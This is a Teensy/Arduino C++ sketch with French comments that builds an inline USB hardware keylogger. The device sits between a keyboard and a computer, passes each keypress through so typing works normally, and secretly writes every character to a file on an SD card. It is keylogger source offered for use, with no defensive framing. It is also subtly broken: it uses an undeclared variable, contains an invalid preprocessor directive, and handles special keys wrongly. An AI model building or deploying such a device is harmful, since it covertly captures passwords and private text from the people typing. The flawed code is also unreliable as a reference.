//Inclure les bibliothèques nécessaires
#include "USBHost_t36.h"
#include "SD.h"

//Définir les constantes
#define SHOW_KEYBOARD_DATA

//Déclarer les objets USB
USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
BluetoothController bluet(myusb);

//Déclarer les objets HID Parser
USBHIDParser hid1(myusb);
USBHIDParser hid2(myusb);
USBHIDParser hid3(myusb);

//Définir les variables
uint8_t keyboard_modifiers = 0;
#ifdef KEYBOARD_INTERFACE
  uint8_t keyboard_last_leds = 0;
#elif !defined(SHOW_KEYBOARD_DATA)
  #Warning: "USB type does not have Serial, so turning on SHOW_KEYBOARD_DATA"
  #define SHOW_KEYBOARD_DATA
#endif

//Méthode appelée une seule fois au démarrage du programme
void setup() {
  //Initialiser le port série si SHOW_KEYBOARD_DATA est défini
  #ifdef SHOW_KEYBOARD_DATA
    while (!Serial);
    Serial.println(">> House Of The Bees ! <<");
  #endif
    //Initialiser l'objet USB
    myusb.begin();

  //Configurer le clavier pour détecter les pressions
  #ifdef SHOW_KEYBOARD_DATA
    keyboard1.attachPress(OnPress);
  #endif

  //Vérifier si la carte SD est présente
  if (!SD.begin(BUILTIN_SDCARD)){
    Serial.println("SD card failed, or not present");
    return;
  }  

  //Ouvrir le fichier de log de données
  dataLog = SD.open("dataLog.txt", FILE_WRITE);

}

//Méthode appelée en boucle
void loop() {
  //Effectuer les tâches USB
  myusb.Task();
}


//Définir les variables pour la surveillance des périphériques USB et HID
#ifdef SHOW_KEYBOARD_DATA
//Définir les pilotes USB à surveiller
USBDriver *usb_drivers[] = {&hub1, &hid1, &hid2, &hid3, &bluet};
const int num_usb_drivers = sizeof(usb_drivers) / sizeof(usb_drivers[0]);
const char *usb_driver_names[num_usb_drivers] = {"Hub1", "HID1" , "HID2", "HID3", "BlueTooth"};
bool usb_driver_active[num_usb_drivers] = {false, false, false, false, false};

//Définir les pilotes HID à surveiller
USBHIDInput *hid_drivers[] = {&keyboard1};
const int num_hid_drivers = sizeof(hid_drivers) / sizeof(hid_drivers[0]);
const char *hid_driver_names[num_hid_drivers] = {"KB"};
bool hid_driver_active[num_hid_drivers] = {false};

//Définir les pilotes BTHID à surveiller
BTHIDInput *bthid_drivers[] = {&keyboard1};
const int num_bthid_drivers = sizeof(bthid_drivers) / sizeof(bthid_drivers[0]);
const char *bthid_driver_names[num_bthid_drivers] = {"KB(BT)"};
bool bthid_driver_active[num_bthid_drivers] = {false};
#endif


void OnPress(int key) {
  static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
  static const char* specialKeys[] = {
                                    "UP", "DN", "LEFT", "RIGHT", "Ins", "Del", "PUP",
                                     "PDN", "HOME", "END", "F1", "F2", "F3", "F4", "F5",
                                     "F6", "F7", "F8", "F9", "F10", "F11", "F12"
                                };
                                
  static const size_t numSpecialKeys = sizeof(specialKeys) / sizeof(specialKeys[0]);
  
  if (key == KEYD_ENTER || key == KEYD_RETURN) {
    Serial.println("");
  } else if (key < numSpecialKeys) {
    Serial.print(specialKeys[key]);
  } else {
    char ch = (char)key;
    Keyboard.print(ch);
    dataLog.print(ch);
    Serial.print(ch);
  }
  
  if (dataLog && dataLog.availableForWrite() < 32) {
    dataLog.flush();
  }
}
